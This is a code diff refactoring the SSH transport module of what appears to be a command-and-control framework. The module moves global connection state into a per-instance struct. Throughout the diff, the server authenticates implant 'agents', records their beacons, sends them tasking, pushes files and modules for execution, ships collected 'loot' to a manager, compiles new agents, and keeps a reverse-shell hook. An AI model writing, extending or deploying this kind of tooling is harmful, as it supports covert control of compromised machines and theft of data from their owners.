@@ -4,40 +4,54 @@ int type = 99; // type TRANSPORT
 
 char *name = "SSH Transport";
 int id = 55;
+int default_port = 22;
 
-int port = 22;
-ssh_bind sshbind;
-ssh_session session;
-ssh_channel channel;
-pClientDat data;
+typedef struct _dat_str {
+    pClientDat data;
+    int portno;
+    ssh_bind sshbind;
+    ssh_session session;
+    ssh_channel channel;
+} data_struct, pdata_struct;
+
 
 transport_t transport_api = {
     send_ok, send_err, listen, read, write,
     get_loot, upload_file, init_reverse_shell, 
-    determine_handler, init, end, nullptr, 
-    get_data, get_name, get_id, set_port
+    determine_handler, get_dat_siz, init, end, nullptr, 
+    get_name, get_id, set_port, get_agent_name
 };
 
-int init(pClientDat dat)
+int init(void* instance_struct)
 {
-    data = dat;
+    data_struct *tmp_struct = (data_struct*)instance_struct;
+    return 0;
 }
 
-int end()
+int end(void* instance_struct)
 {
-    ssh_bind_free(sshbind);
+    data_struct *dat_structure = (data_struct*)instance_struct;
+    
+    ssh_bind_free(dat_structure->sshbind);
     ssh_finalize();
+    return 0;
 }
 
-char *get_name(){
+char *get_name(void* instance_struct){
     return name;
 }
 
-int get_id(){
+int get_id(void* instance_struct){
     return id;
 }
 
-int determine_handler(){
+int get_dat_siz(){
+    return sizeof(data_struct);
+}
+
+int determine_handler(void* instance_struct){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
     ssh_message message;
     int rc = 0;
     int msgType = REQ_NONE;
@@ -51,12 +65,12 @@ int determine_handler(){
     
     do {
 		//printf("entered message loop\n");
-        message = ssh_message_get(session);
+        message = ssh_message_get(dat_structure->session);
         if(message){
             switch(ssh_message_type(message)){
                 case SSH_REQUEST_CHANNEL_OPEN:
                     if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
-                        channel=ssh_message_channel_request_open_reply_accept(message);
+                        dat_structure->channel=ssh_message_channel_request_open_reply_accept(message);
                         break;
                     }
                 default:
@@ -64,16 +78,16 @@ int determine_handler(){
             }
             ssh_message_free(message);
         }
-    } while(message && !channel);
+    } while(message && !dat_structure->channel);
     
-	if(!channel){
-        printf("Channel error : %s\n", ssh_get_error(session));
+	if(!dat_structure->channel){
+        printf("Channel error : %s\n", ssh_get_error(dat_structure->session));
         ssh_finalize();
         return 1;
     }
     
 	do {
-        message=ssh_message_get(session);
+        message=ssh_message_get(dat_structure->session);
         if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
            ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
 				msgType = REQ_TASKING;
@@ -87,46 +101,46 @@ int determine_handler(){
     switch (msgType)
     {
     case REQ_TASKING:
-        ssh_channel_read(channel, tmp_buffer, 2, 0);
+        ssh_channel_read(dat_structure->channel, tmp_buffer, 2, 0);
             
         if(tmp_buffer[0] == '9'){
-            ssh_channel_write(channel, "ok", 2);
+            ssh_channel_write(dat_structure->channel, "ok", 2);
             return MANAG_TYPE;
 
         } else {
             // Check if ID exists
             memset(buf, 0, sizeof(buf));
             strcat(buf, "agents/");
-            int exists = misc_directory_exists(strcat(buf, data->id));
+            int exists = misc_directory_exists(strcat(buf, dat_structure->data->id));
         
             if(!exists){
-                AgentInformationHandler::init(data->id);
-                printf("Client %s: Initialized agent\n", data->id);
+                AgentInformationHandler::init(dat_structure->data->id);
+                printf("Client %s: Initialized agent\n", dat_structure->data->id);
             }
-            rc = ssh_channel_write(channel, "ok", 3);
+            rc = ssh_channel_write(dat_structure->channel, "ok", 3);
             if(rc == SSH_ERROR){
-                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
+                printf("Client %s: caught ssh error: %s", dat_structure->data->id, ssh_get_error(dat_structure->session));
                 break;
             }
 
-            rc = ssh_channel_read(channel, beacon, sizeof(beacon), 0);
+            rc = ssh_channel_read(dat_structure->channel, beacon, sizeof(beacon), 0);
             if(rc == SSH_ERROR){
-                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
+                printf("Client %s: caught ssh error: %s", dat_structure->data->id, ssh_get_error(dat_structure->session));
                 break;
             }
-            AgentInformationHandler::write_beacon(data->id, beacon);
+            AgentInformationHandler::write_beacon(dat_structure->data->id, beacon);
 
-            tasking = AgentInformationHandler::get_tasking(data->id);
+            tasking = AgentInformationHandler::get_tasking(dat_structure->data->id);
             if(!tasking){
-                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
+                printf("Client %s: caught ssh error: %s", dat_structure->data->id, ssh_get_error(dat_structure->session));
                 perror("Reason");
                 break;
             }
             
             // Write tasking
-            rc = ssh_channel_write(channel, tasking, strlen(tasking));
+            rc = ssh_channel_write(dat_structure->channel, tasking, strlen(tasking));
             if(rc == SSH_ERROR){
-                printf("Client %s: Failed to write to channel: %s", data->id, ssh_get_error(session));
+                printf("Client %s: Failed to write to channel: %s", dat_structure->data->id, ssh_get_error(dat_structure->session));
                 break;
             }
             // Pass to handler
@@ -136,7 +150,7 @@ int determine_handler(){
         
         break;
     default:
-        printf("Client %s: got unknown message type: %d\n", data->id, msgType);
+        printf("Client %s: got unknown message type: %d\n", dat_structure->data->id, msgType);
         break;
     }
 
@@ -148,7 +162,10 @@ int determine_handler(){
 }
 
 /*Uploads a file to some connected entity*/
-int upload_file(char *ptr, int is_module){
+int upload_file(void* instance_struct, char *ptr, int is_module){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
+
     char buff[BUFSIZ];
     char directory[BUFSIZ];
     char logbuff[BUFSIZ];
@@ -164,18 +181,18 @@ int upload_file(char *ptr, int is_module){
     memset(directory, 0, sizeof(directory));
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
     memset(logbuff, 0, sizeof(logbuff));
-    printf("Client %s: Sending file -> %s\n", data->id, ptr);
+    printf("Client %s: Sending file -> %s\n", dat_structure->data->id, ptr);
     
     // get filesize 
     snprintf(buff,8000, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
     size = misc_get_file(buff, &file_data);
         
     if(size < 0){
-        printf("Client %s: filename '%s' does not exist\n", data->id, buff);
+        printf("Client %s: filename '%s' does not exist\n", dat_structure->data->id, buff);
     
-        rc = ssh_channel_write(channel, "er", 3);
+        rc = ssh_channel_write(dat_structure->channel, "er", 3);
         if(rc == SSH_ERROR){
-            printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
+            printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         }
         return 2;
     }
@@ -184,37 +201,37 @@ int upload_file(char *ptr, int is_module){
     sprintf(tmpbuffer, "%d", size_e);
         
     // writes file size
-    rc = ssh_channel_write(channel, tmpbuffer, sizeof(tmpbuffer));
+    rc = ssh_channel_write(dat_structure->channel, tmpbuffer, sizeof(tmpbuffer));
     if(rc == SSH_ERROR){
-        printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
+        printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
     
-    rc = ssh_channel_read(channel, buff, sizeof(buff), 0);
+    rc = ssh_channel_read(dat_structure->channel, buff, sizeof(buff), 0);
     if(rc == SSH_ERROR){
-        printf("Client %s: Failed to read data from channel: %s\n", data->id, ssh_get_error(session));
+        printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
         
      B64::encode((unsigned char *)file_data, size, &enc_data);
         
     // writes file 
-    rc = ssh_channel_write(channel, enc_data, size_e);
+    rc = ssh_channel_write(dat_structure->channel, enc_data, size_e);
     if(rc == SSH_ERROR){
-        printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
+        printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
     memset(tmpbuffer, 0, 8);
     
-    rc = ssh_channel_read(channel, tmpbuffer, 8, 0);
+    rc = ssh_channel_read(dat_structure->channel, tmpbuffer, 8, 0);
     if(rc == SSH_ERROR){
-        printf("Client %s: Failed to read data from channel: %s\n", data->id, ssh_get_error(session));
+        printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
 
     
     if(is_module){
-        printf("Client %s: Execution of module ended with exit code %s\n", data->id, tmpbuffer);
+        printf("Client %s: Execution of module ended with exit code %s\n", dat_structure->data->id, tmpbuffer);
     }
     free(file_data);
     free(enc_data);
@@ -223,7 +240,10 @@ int upload_file(char *ptr, int is_module){
 }
 
 /*Sends over all of the loot to the manager*/
-int get_loot(char *loot){
+int get_loot(void* instance_struct, char *loot){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
+
     char buff[BUFSIZ];
     char name[BUFSIZ];
     char logbuff[BUFSIZ];
@@ -242,7 +262,7 @@ int get_loot(char *loot){
     memset(buff, 0, sizeof(buff));
     memset(name, 0, sizeof(name));
     memset(logbuff, 0, sizeof(logbuff));
-    printf("Manager %s: Sending Loot -> %s\n", data->id, loot);
+    printf("Manager %s: Sending Loot -> %s\n", dat_structure->data->id, loot);
     
     count = 0;
     sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
@@ -261,15 +281,15 @@ int get_loot(char *loot){
     memset(name, 0, sizeof(name));
     sprintf(name, "%d", count);
     
-    rc = ssh_channel_write(channel, name, strlen(name));
+    rc = ssh_channel_write(dat_structure->channel, name, strlen(name));
     if(rc == SSH_ERROR){
-        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
     
-    rc = ssh_channel_read(channel, tmpbf, 3, 0);//rd
+    rc = ssh_channel_read(dat_structure->channel, tmpbf, 3, 0);//rd
     if(rc == SSH_ERROR){
-        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
         return 1;
     }
 
@@ -285,20 +305,20 @@ int get_loot(char *loot){
                 sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), loot, ent->d_name);
                 file = fopen(buff, "r");
                 
-                rc = ssh_channel_write(channel, ent->d_name, strlen(ent->d_name));
+                rc = ssh_channel_write(dat_structure->channel, ent->d_name, strlen(ent->d_name));
                 if(rc == SSH_ERROR){
-                    printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                    printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                     return 1;
                 }
 
-                rc = ssh_channel_read(channel, tmpbf, 3, 0); //ok
+                rc = ssh_channel_read(dat_structure->channel, tmpbf, 3, 0); //ok
                 if(rc == SSH_ERROR){
-                    printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                    printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                     return 1;
                 }
 
                 if(file == NULL){
-                    printf("Manager %s: Could not read loot file %s\n", data->id, buff);
+                    printf("Manager %s: Could not read loot file %s\n", dat_structure->data->id, buff);
                     perror("");
                     return 2;
                 } else {
@@ -317,19 +337,19 @@ int get_loot(char *loot){
                     memset(buff, 0, 256);
                     sprintf(buff, "%d", size_e);
                     
-                    rc = ssh_channel_write(channel, buff, strlen(buff));
+                    rc = ssh_channel_write(dat_structure->channel, buff, strlen(buff));
                     if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                         return 1;
                     }
 
-                    rc = ssh_channel_read(channel, tmpbf, 3, 0);//ok
+                    rc = ssh_channel_read(dat_structure->channel, tmpbf, 3, 0);//ok
                     if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                         return 1;
                     }
                     
-                    rc = ssh_channel_write(channel, tmp_ptr2, strlen(tmp_ptr2));
+                    rc = ssh_channel_write(dat_structure->channel, tmp_ptr2, strlen(tmp_ptr2));
                     fclose(file);
                     free(tmp_ptr2);
 
@@ -337,25 +357,25 @@ int get_loot(char *loot){
                     {
                         printf("Finished writing loot to channel\n");
                         
-                        rc = ssh_channel_write(channel, "fi", 3);
+                        rc = ssh_channel_write(dat_structure->channel, "fi", 3);
                         if(rc == SSH_ERROR){
-                            printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                            printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                             return 1;
                         }
                         closedir(dir);
                         break;
                     }                             
                     
-                    rc = ssh_channel_write(channel, "nx", 3);
+                    rc = ssh_channel_write(dat_structure->channel, "nx", 3);
                     if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                         return 1;
                     }
                     printf("wrote next\n");
                     
-                    rc = ssh_channel_read(channel, tmpbf, 3, 0); //rd
+                    rc = ssh_channel_read(dat_structure->channel, tmpbf, 3, 0); //rd
                     if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
+                        printf("Manager %s: Caught channel error: %s\n", dat_structure->data->id, ssh_get_error(dat_structure->session));
                         return 1;
                     }
                     printf("Read from channel\n");
@@ -371,11 +391,15 @@ int get_loot(char *loot){
     return 0;
 }
 
-void make_agent(char *dat_ptr, char *d_ptr){
+void make_agent(void* instance_struct, char *dat_ptr, char *d_ptr){
+    data_struct dat_structure = *(data_struct*)instance_struct;
+
     AgentInformationHandler::compile(dat_ptr, d_ptr);
 }
 
-int init_reverse_shell(char *id){
+int init_reverse_shell(void* instance_struct, char *id){
+    data_struct dat_structure = *(data_struct*)instance_struct;
+
     /*class Server *srv = instance->get_server();
     std::queue<ConnectionInstance *> dequ;
     ConnectionInstance *inst = nullptr;
@@ -453,43 +477,49 @@ int init_reverse_shell(char *id){
     return 0;
 }
 
-int listen(){
+int listen(void* instance_struct){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
+    printf("[Listen] Address %p->%p\n", instance_struct, dat_structure);
+
+
     int r;
 
     int sock = socket(AF_INET , SOCK_STREAM , 0);
     
-    sshbind=ssh_bind_new();
-    session=ssh_new();
+    dat_structure->sshbind=ssh_bind_new();
+    dat_structure->session=ssh_new();
 
-    ssh_options_set(session, SSH_OPTIONS_FD, &sock);
+    ssh_options_set(dat_structure->session, SSH_OPTIONS_FD, &sock);
 	
-    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
-    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
-    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
+    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
+    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
+    printf("Binding to portno %d...\n", dat_structure->portno);
+    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_BINDPORT, &(dat_structure->portno));
 
-    if(ssh_bind_listen(sshbind)<0){
-        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
+    if(ssh_bind_listen(dat_structure->sshbind)<0){
+        printf("Error listening to socket: %s\n", ssh_get_error(dat_structure->sshbind));
         return 1;
     }
 
     // bind the listener to the port
     printf("Server: Bound to listening port\n");
 
-    r=ssh_bind_accept(sshbind, session);
+    r=ssh_bind_accept(dat_structure->sshbind, dat_structure->session);
     printf("Server: Accepting connection\n");
     if(r==SSH_ERROR){
-      	printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
+      	printf("Error accepting a connection : %s\n",ssh_get_error(dat_structure->sshbind));
         return 1;
     }
-    if (ssh_handle_key_exchange(session)) {
-        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
+    if (ssh_handle_key_exchange(dat_structure->session)) {
+        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(dat_structure->session));
         return 1;
     }
 
-    int rc = authenticate();
+    int rc = authenticate(&instance_struct);
     if (rc != 0)
     {
-        printf("Initialization: Data Failed creation\n", data->id);
+        printf("Initialization: Data Failed creation\n");
         return 1;
     }
     return 0;
@@ -497,14 +527,16 @@ int listen(){
 }
 
 
-int authenticate(){
+int authenticate(void** instance_struct){
+    data_struct *dat_structure = *(data_struct**)instance_struct;
+
     // initialize variables
     int auth=0;
     char *name = NULL;
     ssh_message message;
     
     do {
-        message=ssh_message_get(session);
+        message=ssh_message_get(dat_structure->session);
         if(!message)
             break;
         switch(ssh_message_type(message)){
@@ -541,64 +573,87 @@ int authenticate(){
     // Check if the client authenticated successfully
 	if(auth != 1){
         printf("Server: Terminating connection\n");
-        ssh_disconnect(session);
+        ssh_disconnect(dat_structure->session);
         return 1;
     } else {
-        data->id = name;
+        dat_structure->data->id = name;
         
         return 0;
     }
     return 1;
 }
 
-int read(char **buff, int length){
+int read(void* instance_struct, char **buff, int length){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
     int rc = 0;
-    rc = ssh_channel_read(channel, *buff, length, 0);
+    rc = ssh_channel_read(dat_structure->channel, *buff, length, 0);
     if (rc == SSH_ERROR)
     {
-        printf("Failed to handle agent: %s\n", ssh_get_error(session));
+        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
         return 1;
     }
     return 0;
         
 }
 
-int write(char *buff, int length){
+int write(void* instance_struct, char *buff, int length){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
     int rc = 0;
-    rc = ssh_channel_write(channel, buff, length);
+    rc = ssh_channel_write(dat_structure->channel, buff, length);
     if(rc == SSH_ERROR){
-        printf("Failed to handle agent: %s\n", ssh_get_error(session));
+        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
         return 1;
     }
     return 0;
 }
 
-int send_err(){
+int send_err(void* instance_struct){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
     int rc = 0;
-    rc = ssh_channel_write(channel, "er", 3);
+    rc = ssh_channel_write(dat_structure->channel, "er", 3);
     if (rc == SSH_ERROR)
     {
-        printf("Failed to handle agent: %s\n", ssh_get_error(session));
+        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
         return 1;
     }
     return 0;
 }
 
-int send_ok(){
+int send_ok(void* instance_struct){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
     int rc = 0;
-    rc = ssh_channel_write(channel, "ok", 3);
+    rc = ssh_channel_write(dat_structure->channel, "ok", 3);
     if (rc == SSH_ERROR)
     {
-        printf("Failed to handle agent: %s\n", ssh_get_error(session));
+        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
         return 1;
     }
     return 0;
 }
 
-void set_port(int portno){
-    port = portno;
+void set_port(void* instance_struct, int portno){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+    printf("Address %p->%p\n", instance_struct, dat_structure);
+
+    fflush(stdout);
+
+    printf("received port number %d\n", portno);
+    if(portno == 0){
+        printf("Portno was zero, like it should be...\n");
+        dat_structure->portno = default_port;
+    } else {
+        dat_structure->portno = portno;
+    }
+
+    printf("Current port setting: %d\n", dat_structure->portno);
 }
 
-pClientDat get_data(){
-    return data;
+char *get_agent_name(void* instance_struct){
+    data_struct *dat_structure = (data_struct*)instance_struct;
+
+    return dat_structure->data->id;
 }
